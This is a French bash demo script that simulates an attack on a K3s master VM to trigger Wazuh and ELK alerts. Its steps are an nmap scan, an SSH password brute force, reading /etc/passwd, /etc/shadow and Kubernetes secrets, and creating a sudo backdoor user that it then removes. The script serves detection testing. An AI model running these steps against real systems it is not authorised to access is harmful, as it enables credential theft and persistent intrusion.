#!/bin/bash
# =============================================================
#  SCRIPT DE DEMO - SIMULATION D'ATTAQUE SUR VM K3S MASTER
#  Objectif : déclencher des alertes visibles dans Wazuh + ELK
#  Usage    : bash demo_attack.sh <IP_VM_K3S> <USER>
# =============================================================

TARGET_IP=${1:-"192.168.1.100"}
TARGET_USER=${2:-"root"}

echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║        DEMO SECURITE - SIMULATION D'ATTAQUE      ║"
echo "║     Infrastructure : VM K3S Master               ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""

# -------------------------------------------------------------
# ETAPE 1 : RECONNAISSANCE - Scan de ports
# -------------------------------------------------------------
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[ETAPE 1] RECONNAISSANCE - Scan de ports"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ">> Un attaquant commence toujours par scanner les ports ouverts"
echo ">> pour identifier les services exposés sur la cible."
echo ""
echo "Commande : nmap -sV -p 22,80,443,6443,8080,10250 $TARGET_IP"
echo ""

if command -v nmap &> /dev/null; then
    nmap -sV -p 22,80,443,6443,8080,10250 "$TARGET_IP"
else
    echo "[!] nmap non installé - simulation ignorée"
fi

echo ""
read -p "Appuyez sur ENTREE pour continuer vers l'étape 2..."

# -------------------------------------------------------------
# ETAPE 2 : BRUTE FORCE SSH
# -------------------------------------------------------------
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[ETAPE 2] BRUTE FORCE SSH"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ">> L'attaquant tente de se connecter en SSH avec des"
echo ">> mots de passe courants. Chaque échec génère un log"
echo ">> d'authentification que Wazuh surveille en temps réel."
echo ""
echo "Simulation de 6 tentatives avec de mauvais mots de passe..."
echo ""

FAKE_PASSWORDS=("admin" "password" "123456" "root" "toor" "letmein")

for pwd in "${FAKE_PASSWORDS[@]}"; do
    echo "  [TENTATIVE] Login: $TARGET_USER | Password: $pwd"
    sshpass -p "$pwd" ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=3 \
        -o BatchMode=no \
        "$TARGET_USER@$TARGET_IP" exit 2>/dev/null || true
    sleep 1
done

echo ""
echo "  [!] 6 tentatives échouées -> Alerte Wazuh : rule 5763 (SSH brute force)"
echo ""
read -p "Appuyez sur ENTREE pour continuer vers l'étape 3..."

# -------------------------------------------------------------
# ETAPE 3 : CONNEXION REUSSIE + RECONNAISSANCE INTERNE
# -------------------------------------------------------------
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[ETAPE 3] CONNEXION REUSSIE + RECONNAISSANCE INTERNE"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ">> Une fois connecté, l'attaquant explore le système :"
echo ">> lecture de fichiers sensibles, liste des utilisateurs,"
echo ">> état du cluster Kubernetes. Ces actions génèrent des"
echo ">> logs auditd détectés par Wazuh."
echo ""
echo "Connexion SSH sur $TARGET_IP et exécution des commandes suspectes..."
echo ""

ssh -o StrictHostKeyChecking=no "$TARGET_USER@$TARGET_IP" bash <<'REMOTE'
echo "  [*] Lecture de /etc/passwd (liste des utilisateurs)"
cat /etc/passwd | head -20

echo ""
echo "  [*] Lecture de /etc/shadow (hashes des mots de passe)"
cat /etc/shadow 2>/dev/null || echo "  [!] Accès refusé (permission denied)"

echo ""
echo "  [*] Vérification des pods Kubernetes"
kubectl get pods --all-namespaces 2>/dev/null || echo "  [!] kubectl non accessible"

echo ""
echo "  [*] Recherche de secrets Kubernetes"
kubectl get secrets --all-namespaces 2>/dev/null || echo "  [!] Accès refusé"

echo ""
echo "  [*] Liste des connexions réseau actives"
ss -tulnp

echo ""
echo "  [*] Vérification des crons (persistance possible)"
crontab -l 2>/dev/null
ls /etc/cron.d/ 2>/dev/null
REMOTE

echo ""
read -p "Appuyez sur ENTREE pour continuer vers l'étape 4..."

# -------------------------------------------------------------
# ETAPE 4 : CREATION D'UN UTILISATEUR BACKDOOR
# -------------------------------------------------------------
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "[ETAPE 4] CREATION D'UN UTILISATEUR BACKDOOR"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ">> L'attaquant crée un compte caché pour maintenir"
echo ">> un accès persistant même si sa session est détectée."
echo ">> Wazuh détecte immédiatement la création de nouveaux users."
echo ""

ssh -o StrictHostKeyChecking=no "$TARGET_USER@$TARGET_IP" bash <<'REMOTE'
echo "  [*] Création d'un utilisateur 'svc_backup' (backdoor)"
useradd -m -s /bin/bash svc_backup 2>/dev/null && echo "  [+] Utilisateur créé" || echo "  [!] Erreur création user"

echo "  [*] Ajout au groupe sudo"
usermod -aG sudo svc_backup 2>/dev/null && echo "  [+] Ajouté au groupe sudo" || echo "  [!] Erreur"

echo "  [*] Nettoyage (suppression du backdoor pour la démo)"
userdel -r svc_backup 2>/dev/null && echo "  [+] Utilisateur supprimé"
REMOTE

echo ""
read -p "Appuyez sur ENTREE pour voir la détection via MCP..."

# -------------------------------------------------------------
# FIN - RESUME
# -------------------------------------------------------------
echo ""
echo "╔══════════════════════════════════════════════════╗"
echo "║              ATTAQUE SIMULEE - RESUME            ║"
echo "╠══════════════════════════════════════════════════╣"
echo "║  ✓ Etape 1 : Scan de ports (nmap)                ║"
echo "║  ✓ Etape 2 : Brute force SSH (6 tentatives)      ║"
echo "║  ✓ Etape 3 : Reconnaissance interne              ║"
echo "║  ✓ Etape 4 : Création utilisateur backdoor       ║"
echo "╠══════════════════════════════════════════════════╣"
echo "║  --> Ouvrir Claude et demander :                 ║"
echo "║  'Analyse les alertes Wazuh des 10 dernières mn' ║"
echo "╚══════════════════════════════════════════════════╝"
echo ""
